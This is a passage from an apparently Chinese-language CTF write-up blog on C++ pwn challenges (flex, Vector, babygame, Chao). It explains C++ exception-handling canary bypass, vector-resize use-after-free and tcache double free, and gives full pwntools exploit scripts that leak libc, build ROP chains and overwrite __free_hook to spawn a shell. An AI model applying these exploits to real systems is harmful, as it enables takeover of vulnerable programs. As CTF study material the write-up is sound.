alt="img"></p><p>很明显的负数溢出，然后可以栈溢出嘿嘿嘿，但是这玩意有个canary，bad，这比🐍不出来还要难受🥵</p><p>但是很明显这个func里存在奇怪的东西，throw，👴感觉这玩意有问题，但是👴8知道哪里有问题。</p><p><img src="/img/C++/7.png" alt="img"></p><p>摸不出来的👴只能去网上冲浪，卑微的窝在阴暗的下水道里读着大跌们的wp</p><p>然后👴明白啦</p><h3 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h3><p>try、throw、catch这三个卧龙凤雏总是一起出现</p><p>Throw抛出异常，try 包含异常模块，catch 捕捉抛出的异常</p><p>当程序throw一个异常的时候，基本流程是这样的喵</p><p>1、调用 __cxa_allocate_exception 函数，分配一个异常对象。</p><p><img src="/img/C++/8.png" alt="img"></p><p>2、调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。</p><p><img src="/img/C++/9.png" alt="img"></p><p>3、__cxa_throw() 调用 _Unwind_RaiseException() 从而开始 unwind（unwind“回退”是伴随异常处理机制引入 C++ 中的一个新概念，主要用来确保在异常被抛出、捕获并处理后，所有生命期已结束的对象都会被正确地析构，它们所占用的空间会被正确地回收。）。</p><p><img src="/img/C++/10.png" alt="img"></p><p>4、_Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。</p><p>5、如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。</p><p>6、_Unwind_RaiseException() 将控制权转到相应的catch代码。</p><p>然后👴就发现异常处理后👴就来到了一个奇怪的地方</p><p><img src="/img/C++/11.png" alt="img"></p><p>仔细一看，欸，原来function1里的try和catch模块反编译时并没有出来。</p><p>那这么一说，👴从孙子函数跳到了儿子函数并且没有经过canary的check，win！！</p><p>那么问题来了，该怎么食用这个漏洞捏。</p><p>6年前爹爹们的思路是：如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了。</p><p>妙，实在是妙啊。</p><p>PS：返回地址一定要填try和catch之间的地址（只有这样才能被捕获异常）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./flex&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./flex&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>pop_rdi = <span class="hljs-number">0x00000000004044d3</span><br>ret = <span class="hljs-number">0x0000000000400ba9</span><br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;no&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">2</span>).encode())<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x40134f\nc\n&quot;</span>)<br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span> + p64(<span class="hljs-number">0x6061c0</span>) + p64(<span class="hljs-number">0x401512</span>)<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,paylaod)<br><br>payload = flat([<br>    <span class="hljs-number">0x4044ca</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<span class="hljs-number">0x100</span>,<span class="hljs-number">0x606260</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x4044b0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>])<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>payload = p64(<span class="hljs-number">0xe3afe</span>+libc.address)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>爽啊，果然还是🐍出来才是最爽的啊😋</p><h2 id="hgame2022-Vector😎"><a href="#hgame2022-Vector😎" class="headerlink" title="hgame2022 Vector😎"></a>hgame2022 Vector😎</h2><p>跟vector容器有关的一道菜单堆</p><p>多了一个move function，那问题肯定在里面。</p><p><img src="/img/C++/12.png" alt="img"></p><p>当move输入的nex_idx过大时，resize会申请一个更大的chunk，并把原来chunk中的数据复制过去。可以看到，这个操作是在note[idx]</p><p>&#x3D; nullptr之前，因此note[idx] &#x3D; nullptr实际上是在给已经废弃的note中的idx置0。这样便能造成UAF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vector&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./vector&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">new_index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(new_index).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(<span class="hljs-number">7</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc70</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>move(<span class="hljs-number">10</span>)<br>move(<span class="hljs-number">9</span>)<br><br>move(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">32</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x50</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>delete(<span class="hljs-number">8</span>)<br>gdb.attach(p)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CTF-2021-babygame🤮"><a href="#CTF-2021-babygame🤮" class="headerlink" title="*CTF 2021 babygame🤮"></a>*CTF 2021 babygame🤮</h2><p>逆个🐕8，🧠要炸了</p><p>👴一开始觉得👴把9个关卡通关了👴就win了，8就是玩游戏🐎，👴在行，so easy</p><p>然后就没有然后了，👴对着IDA那坨屎山代码看了两个小时看不出来，👴摆了，润</p><p>后来👴想着fuzz试试，结果这个🐕8glibc是glibc-2.27 ubuntu1.2的版本，tcache里还莫得check，tcache 的double free根本8会报错，妈妈生的。</p><p>👴🏳️，钻进👴在下水道阴暗的小窝里看A3👴的wp，👴好奇A3👴是怎么调出来完成一个关卡后，选定一个关卡，然后退出会造成UAF的。</p><p>然后就很简单了，string可以申请任意大小的chunk，配合tcache double free 打free_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babygame&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">x</span>):<br>    sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>    cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br>    cmd(<span class="hljs-string">b&#x27;w&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;korey0sh1&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;l&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>decode()<br>cmd(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="hljs-number">10</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(<span class="hljs-string">b&#x27;q&#x27;</span>)<br>cmd(<span class="hljs-string">b&#x27;y&#x27;</span>)<br><br>cmd(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x48</span>)<br>cmd(<span class="hljs-string">b&#x27;n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="CATCTF-2022-Chao🛏️💤"><a href="#CATCTF-2022-Chao🛏️💤" class="headerlink" title="CATCTF 2022 Chao🛏️💤"></a>CATCTF 2022 Chao🛏️💤</h2><p>winmt👴出的C++ Pwn</p><p>逆吐啦🤮🤮🤮🤮</p><p>Create里有0和1两种type，但观察update和show功能后，就能发现这两个功能只适配type0。然后看看两种type不同的虚表函数，就发现update type1能直接伪造size和show的基址，便可以任意地址读。</p><p>存在栈溢出漏洞，然后用0xfffffff7+0xa-1这种补码漏洞来触发C++异常处理绕过canary check</p><p><img src="/img/C++/13.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;chao&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;?\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">1</span>,p32(<span class="hljs-number">0xdeadbeaf</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    edit(i+<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>*<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0x11111</span>))<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>heap_base = u32(rc(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x5710</span><br><br>libc.address = u32(ru(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:]) - <span class="hljs-number">0x1e8780</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>edit(<span class="hljs-number">0</span>,p32(<span class="hljs-number">0xfffffff6</span>)+p32(heap_base+<span class="hljs-number">0x4ba9</span>))<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>elf_base = u32(rc(<span class="hljs-number">3</span>).rjust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x0c&#x27;</span>)) - <span class="hljs-number">0x4e0c</span><br>leak(<span class="hljs-string">&quot;elf&quot;</span>,elf_base)<br><br>lea_ret =  <span class="hljs-number">0x00110226</span>+libc.address<br>add_esp_1c = <span class="hljs-number">0x0001b034</span> + libc.address<br>ret = libc.address + <span class="hljs-number">0x0001922e</span><br>add_esp_4 = <span class="hljs-number">0x0002fe0e</span> + libc.address<br>add_esp_8 = <span class="hljs-number">0x0002fbe9</span> + libc.address<br>add_esp_c = <span class="hljs-number">0x0001b90a</span> + libc.address<br>int_0x80 = <span class="hljs-number">0x000312f5</span> + libc.address<br>pop_eax = <span class="hljs-number">0x000282eb</span> + libc.address<br>pop_ebx = <span class="hljs-number">0x0001de56</span> + libc.address<br>pop_ecx_edx = <span class="hljs-number">0x00030ea3</span> + libc.address<br>payload = flat([<br>    heap_base+<span class="hljs-number">0x54e8</span>,add_esp_1c,<br>    <span class="hljs-number">0x22222222</span>,<span class="hljs-number">0x33333333</span>,<span 